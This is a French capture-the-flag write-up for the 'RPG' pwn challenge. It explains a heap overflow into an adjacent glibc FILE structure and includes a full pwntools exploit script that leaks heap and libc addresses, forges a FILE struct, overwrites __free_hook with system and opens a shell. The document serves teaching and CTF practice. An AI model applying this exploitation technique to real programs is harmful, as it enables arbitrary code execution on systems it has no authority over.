#### RPG

était un challenge de pwn où il s'agissait d'exploiter un heap overflow d'un buffer

sur une structure FILE * adjacente..

Et d'utiliser la structure FILE * comme une primitive read/write suivant la technique classique

évoquée par angelboy

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

slides 62 à 70 en particulier..

L'exploitation demandait un peu d'astuce car le contenu du buffer overflow était copié via un strcpy,

ce qui demandait d'écrire les zéros grâce au zéro terminant la string copiée..

voir le code pour mieux comprendre la technique

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("./rpg_patched")
libc = ELF("./libc-2.33.so")

host, port = "challenges.france-cybersecurity-challenge.fr", "2056"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

p.sendlineafter('name> ', 'aaa')
p.sendline('/nick '+'A'*0x87+'\xff'+'\x00'*0x450 )
p.sendline('/roll '+'1')

p.recvuntil('\x40\x41\x41\x41\x41\x41\xff',drop=True)
heap = u64(p.recvuntil(' ', drop=True).ljust(8,b'\x00'))
if args.REMOTE:
  heap_base = heap - 0x788
else:
  heap_base = heap - 0x1a48

print('heap leak = '+hex(heap))
print('heap base = '+hex(heap_base))

# we overwrite _IO_read_ptr, to use FILE structure as a read primitive
# read an address
def readaddr(addr):
  p.sendline(b'/nick '+b'Z'*0x88+p64(addr))
  p.sendline(b'/roll '+b'18446744073709551615')
  p.recvuntil(b'1d9223372036854775807: ',drop=True)
  val = int(p.recvuntil(b'\n',drop=True),10)
  return val


# use the read primitive to leak a libc address
leak = readaddr(heap_base+0x3f8)  #<<(i*8)
print('leak = '+hex(leak))
libc.address = leak - 0x1e24a0
print('libc base = '+hex(libc.address))

# we recreate FILE structure, to use it as a write primitive
# we write from end to begin of buffer, using zero terminated string to write zeroes..
#
def write_strcpy(payload):
  offset = 0x80
  pos = len(payload)-1
  while(pos>=0):
    c = payload[pos]
    if (c==0):
      p.sendline(b'/nick '+b'Z'*(offset+pos))
      pos -= 1
    else:
      apos = pos
      while ((payload[apos-1] != 0) and (apos>=0)):
        apos -= 1
      p.sendline(b'/nick '+b'Z'*(offset+apos)+payload[apos:pos+1])
      pos = apos-1


#--------------------------------------------------------------
# target to be overwritten --> __free_hook
target = libc.sym['__free_hook']
len_target = 0x10
# we recreate the file structure to use it as a write primitive
payload =  p64(0xfbad2488) + p64((heap-8)+0x1000) + p64((heap-8)+0x1000) + p64(heap-8)*4 + p64(target) + p64(target+len_target) + p64(0)*4 + p64(libc.address + 0x1e15e0) + p8(0)
write_strcpy(payload)

p.sendline(b'/roll 256')
# overwrite  __free_hook  with system address
p.sendline(p64(libc.sym['system'])*2)


# from now everything entered via getline, will be executed, basically we got a shell when trying to free the buffer

p.interactive()

```

